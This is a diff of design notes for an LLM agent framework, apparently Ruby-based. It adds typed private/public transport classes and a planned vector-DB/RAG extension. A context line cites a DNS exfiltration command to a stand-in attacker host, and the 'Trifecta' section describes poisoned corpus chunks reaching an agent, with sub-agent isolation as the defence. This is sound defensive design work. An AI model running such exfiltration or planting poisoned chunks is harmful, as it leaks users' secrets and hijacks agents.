@@ -104,15 +104,78 @@ LLM provider itself when non-local. DNS exfil
 (`nslookup secret.attacker.com`) is sneaky — 60+ bytes per query, and
 most egress firewalls don't filter port 53.
 
-### Provider-cliff startup banner
+### Typed transport classes (private vs public)
 
-The privacy cliff at the LLM provider boundary is documented in
-[`SECURITY.md`](SECURITY.md) §"Code trust" — LLM provider bullet
-(local llama.cpp default vs. opting into a third-party provider).
-The boundary currently moves *silently* when the user reconfigures
-`ruby_llm` — worth a loud startup banner ("Outbound LLM provider:
-api.openai.com — your prompts and tool results will be sent
-there") so the cliff is visible at the moment it matters.
+v0 thought: a loud startup banner at the privacy boundary
+documented in [`SECURITY.md`](SECURITY.md) §"Code trust" — LLM
+provider bullet ("Outbound LLM provider: api.openai.com — your
+prompts and tool results will be sent there"). Fine sketch,
+structurally weak — the user can click through a banner, and
+per-action banners ("indexer about to send 3 MB to
+api.openai.com") are inconsistent with the chat path that has
+been silently sending prompts to the same provider all along.
+The leak is set at chat-config time, not at fire time.
+
+Stronger shape, surfaced while scoping pikuri-vectordb (which
+adds two more LLM-shaped transports — embedder and reranker —
+on top of ruby_llm's chat transport): classify the transport
+instance itself as `:private` or `:public`, derived from its
+endpoint host, and let `Pikuri::Agent.new` refuse to mix classes
+by default.
+
+Rough shape:
+
+    module Pikuri::Transport
+      class Local
+        def privacy_class; :private; end
+      end
+      class OpenAI
+        def initialize(api_key:, base_url: 'https://api.openai.com')
+          @base_url = base_url
+        end
+        def privacy_class
+          URI(@base_url).host =~ /\A(localhost|127\.|\[?::1)/ \
+            ? :private : :public
+        end
+      end
+      # Embedder::*, Reranker::*, etc. each declare their own.
+    end
+
+    Pikuri::Agent.new(transport: chat, privacy: :strict)
+    # extensions / sub-agents whose transports differ in class are
+    # rejected at construction. :mixed opts out and logs every
+    # transport class loudly at boot.
+
+Three load-bearing points:
+
+- **Classification belongs to the transport instance**, derived
+  from the URL host. Loopback / `::1` / Unix socket → `:private`;
+  everything else → `:public`. LAN IPs, Tailscale endpoints, a
+  Caddy reverse-proxy on `localhost:8080` pointed at OpenAI —
+  pikuri can't verify network topology and won't try. Documented
+  limitation, not a defect.
+- **Fail-fast at construction, not per-request.** Strict mode
+  refuses cross-class wiring; `:mixed` is the explicit opt-in for
+  "private chat + public embedder" with loud boot logging.
+  Default is `:strict` in `bin/pikuri-assistant`; no-op in
+  `bin/pikuri-chat` where there's only the one transport today.
+- **The concept ends up broader than ruby_llm.** Embedders ride
+  `RubyLLM.embed`; rerankers don't exist in ruby_llm at all, so
+  `Pikuri::Transport::Reranker::*` is pikuri-core's own
+  first-class type, not a ruby_llm adapter. Argument for putting
+  classification *above* ruby_llm in the abstraction stack
+  rather than bolting it onto ruby_llm's config.
+
+`:private` and `:public` are also docs anchors — named concepts
+in the guide so the cliff is teachable, not something the user
+discovers from a banner one day.
+
+Sequencing: pikuri-vectordb v1 ships with plain URL arguments
+(`embedder:` / `reranker:` accept strings or transport objects
+interchangeably), and typed transports land in a follow-up
+session that touches pikuri-core and pikuri-vectordb together.
+Vectordb's transport configuration is constructor-only, so
+retrofitting is local.
 
 ### MCP — open ergonomic / supply-chain questions
 
@@ -583,7 +646,7 @@ about X and summarize"), but it's not the primary recall path.
 - how the embedding model story works (local
   sentence-transformers vs. provider-hosted — the provider-hosted
   path re-opens the same "outbound LLM provider" cliff covered in
-  §"Provider-cliff startup banner");
+  §"Typed transport classes (private vs public)");
 - whether one always-in-prompt builtin + one external semantic
   provider justifies a small plugin ABC after all (not hermes' 10
   hooks, but a `prefetch` + `sync_turn` + `system_prompt_block`
@@ -644,3 +707,191 @@ about X and summarize"), but it's not the primary recall path.
   agent-curated memory. Distinct but adjacent — worth documenting
   in the gem's yardoc and probably in `COMPARISON.md` so the
   boundary is explicit.
+
+## Vector DB / RAG
+
+Surfaced while scoping pikuri-assistant — RAG and agentic search
+over a local document corpus are mandatory for an assistant binary
+worth running. Designed but not yet built; sketched here so a
+future contributor knows the shape that was settled on and where
+the deferrals are.
+
+The shape lands as `pikuri-vectordb`: an extension that wires a
+`vectordb_search` tool into the agent (agentic search — the agent
+decides when to retrieve), backed by a configurable embedder + an
+optional reranker + a swappable backend. A bundled `LIBRARIAN`
+persona provides the privilege-separated sub-agent variant.
+
+### Extension shape
+
+    Pikuri::VectorDb::Extension.new(
+      backend:    Pikuri::VectorDb::Backend::Chroma.new(host:, port:),
+      sources:    ['~/notes', '~/docs'],
+      collection: 'my-docs',
+      embedder:   nil,    # nil = use RubyLLM.embed default
+      reranker:   nil,    # nil = top-k only, no rerank
+      chunker:    Pikuri::VectorDb::Chunker::FixedWindow.new(
+                    size: 512, overlap: 50,
+                  ),
+    )
+
+Backend and sources are orthogonal — same folder can be indexed
+into either backend behind the same `Backend` interface. The
+extension registers `vectordb_search(query:)` on the parent agent,
+a `vectordb_reindex` administrative tool (nuke-and-reload), and a
+bundled `LIBRARIAN` persona referencing `vectordb_search` only.
+
+### Concerns kept separate
+
+- **Backend.** Pure-Ruby `Backend::InMemory` (cosine over
+  `Array<Float>`, ~40 lines) as the educational default — fits
+  "small enough to audit" and reads in one sitting. `Backend::Chroma`
+  as the persistent backend, behind the same interface. pgvector /
+  Qdrant later if a concrete need shows up. Demo + docs walk the
+  in-memory backend first (explain how the math works), then
+  promote to Chroma for persistence.
+- **Embedder.** Reuses ruby_llm's `RubyLLM.embed` (OpenAI / Voyage /
+  local llama.cpp's `/v1/embeddings`). Default is whatever the user's
+  chat provider chose; consistency with the chat transport is what
+  §"Typed transport classes (private vs public)" enforces structurally
+  once that lands.
+- **Reranker.** Not in ruby_llm. Lives in pikuri-core as
+  `Pikuri::Transport::Reranker::LlamaServer` and `::Cohere` (both
+  speak `/v1/rerank`; cross-encoder model on the llama-server side
+  or hosted Cohere). Optional — `reranker: nil` skips rerank, top-k
+  retrieval only. When configured: retrieve top-50, rerank → top-5.
+  Reranker outages fall back to vector-only top-k and log loudly —
+  it's a quality knob, not a correctness one.
+- **Chunker.** Configurable via the extension; v1 default is
+  fixed-window (512 tokens, 50 overlap) over text extracted from
+  Markdown / PDF / HTML / plain text — same format set
+  `Workspace::Read` already handles. Markdown-heading-aware,
+  AST-aware, contextual chunking, parent-document retrieval are all
+  real quality wins, all defer to follow-ups.
+- **Identity.** Chunks keyed on `(path, content_hash, offset)` so
+  partial updates don't blow the whole index away once incremental
+  reindex lands. v1 nukes-and-reloads, but the key scheme is
+  forward-compatible.
+
+### Boot, reindex, file types
+
+- **Boot.** `Backend::InMemory` always re-indexes at boot (data only
+  lives in RAM anyway). `Backend::Chroma` indexes at boot if the
+  collection is empty, otherwise leaves it alone.
+- **Reindex.** `vectordb_reindex` nukes the collection and reloads
+  from sources. Acceptable for v1; incremental reindex is a
+  follow-up once auto-watch is on the table.
+- **File types.** Plain text, Markdown, PDF, HTML — same set
+  `Workspace::Read` already extracts. Other formats raise
+  "unsupported"; adding more is a one-line change in the format
+  table.
+
+### The three-model ops footnote
+
+`bin/pikuri-assistant` ends up wanting three LLM endpoints: chat
+(multi-GB), embedder (200 MB – 1 GB), reranker (300 MB – 1 GB).
+Three options the user faces, none of which are pikuri's problem
+to *solve* but all need to be in the docs:
+
+- **Three llama-servers on different ports.** Simplest, runs in
+  parallel, needs the RAM/VRAM headroom. Documented default in
+  the demo.
+- **[llama-swap](https://github.com/mostlygeek/llama-swap).**
+  Single port, lazy-loads on request. Sequential — first query
+  after a chat turn pays the load latency — but fits on a small
+  box. Mentioned as the resource-constrained option.
+- **Ollama / LM Studio.** Native multi-model with OpenAI-compatible
+  endpoints. Some users already run these; works out of the box.
+
+Pikuri stays agnostic: just needs three URLs (or one URL with
+three model names if multiplexed). No llama-swap configs shipped.
+
+### Trifecta
+
+The corpus *is* the threat. Anything indexed becomes a possible
+context entrant whenever it matches a query — same shape as `Read`
+of an untrusted file. Two structural defenses:
+
+1. **`LIBRARIAN` persona as the default flow.** Same shape as
+   `FILE_MINER` (§"Personas for `Tool::SubAgent`"): persona's only
+   tool is `vectordb_search`; the parent receives a summary back,
+   not raw chunks. A poisoned chunk reaches the persona — which
+   has no `bash` / `write` / `fetch` / `agent` to act on. Bundled
+   from `pikuri-vectordb` itself, same precedent as
+   `GIT_REPO_RESEARCHER` shipping from pikuri-code (a persona that
+   needs a tool outside the pikuri-subagents / pikuri-workspace
+   surface). The parent can still invoke `vectordb_search` directly
+   when explicitly wanted, but the default flow goes through the
+   persona.
+2. **Egress.** Three new outbound paths (embedder, reranker,
+   backend). Local default closes leg (c) of the trifecta; remote
+   embedders / rerankers re-open it. The typed transports in
+   §"Typed transport classes (private vs public)" are the
+   structural enforcement — once that lands, mixing a `:private`
+   chat with a `:public` embedder fails at construction unless the
+   agent opted into `:mixed`.
+
+The "user knows what docs they have" assumption holds for
+workspace folders. It stops holding once Onyx connectors pull in
+Google Drive / Slack / Jira — by then you're indexing the open web
+of your inbox, and the persona separation stops being optional.
+Documented in the gem's yardoc.
+
+### Deferred
+
+- **Multi-corpus.** Single corpus per `Extension.new` in v1. Merge
+  semantics across two corpora (which one wins on overlapping
+  top-k? how does the reranker normalize scores from different
+  embedders? how do you tell the LLM which corpus a chunk came
+  from?) aren't worth solving when "one focused corpus per use
+  case" — private notes, company handbook, project docs — is the
+  realistic shape. Revisit if a concrete need arrives.
+- **Auto-watch / incremental reindex.** Listen-gem dep is cheap;
+  the diff logic (which chunks survived, which got replaced, which
+  got deleted) is the hard part. v1 ships `vectordb_reindex` (nuke
+  and reload) as the explicit path; auto-watch becomes the second
+  iteration once explicit reindex is solid.
+- **Classic-RAG-as-listener.** Auto-inject relevant chunks at the
+  start of each turn (no tool call) — hermes' prefetch shape (see
+  §"Memory" prior art). v1 ships agentic search only — fits the
+  loop-agnostic ethos and the agent gets to refine queries. Add
+  the listener variant if a concrete "the model forgot to search"
+  pattern shows up.
+- **Per-doc-type chunkers.** Markdown-heading-aware splitter,
+  AST-aware code chunker, contextual chunking, parent-document
+  retrieval. All real quality wins, all separately scoped features.
+- **Onyx as a separate gem.** Onyx is a product (UI + connector
+  framework + scheduler), not a vector DB. If pikuri wants Google
+  Drive / Slack / Jira RAG, the right shape is `pikuri-onyx` —
+  a thin tool gem that calls a self-hosted Onyx's search API over
+  HTTP. Same precedent as MCP: integrate with the protocol, don't
+  reimplement it. Onyx's heavy operational footprint stays opt-in
+  and out of pikuri-vectordb's scope.
+- **Memory v2 growth tier integration.** §"Memory" v2 needs an
+  external semantic store; pikuri-vectordb is potentially the
+  answer. Deliberately not optimized for that case in v1 — get
+  RAG + agentic search shipped first, then re-investigate whether
+  memory can ride the same primitive (probably with a separate
+  collection rooted at `~/.pikuri/memory/`, fed by a different
+  source pipeline). Revisit explicitly after v1 lands.
+
+### Open questions
+
+- **Chroma client.** Write our own thin HTTP client (4–5 endpoints,
+  ~80 lines, no new dep, audit-friendly, but pikuri owns the
+  breakage when Chroma's REST API shifts) vs. pull in the
+  `chroma-db` gem (less maintained, version-skew risk). Default
+  to writing our own unless a strong case emerges.
+- **`Backend::InMemory` persistence.** Strict RAM only (honest as
+  a teaching backend; everything reloads from sources on every
+  boot) vs. simple `Marshal.dump` to disk (zero-ops persistence at
+  the cost of blurring the educational story). Leaning strict RAM
+  — the user who wants persistence has Chroma right there.
+- **Disk-spillover for over-cap retrieval results.** §"Output-size
+  DoS and cost" flags per-tool caps and tempfile spillover; the
+  vectordb tool needs to land on the same shape from day one
+  rather than retrofit it.
+- **Per-source pre-processing.** Some users will want to skip
+  `.git/`, `node_modules/`, build artifacts; same shape as
+  `.gitignore`. v1 ships a small fixed denylist; configurable
+  ignore rules defer until someone asks.
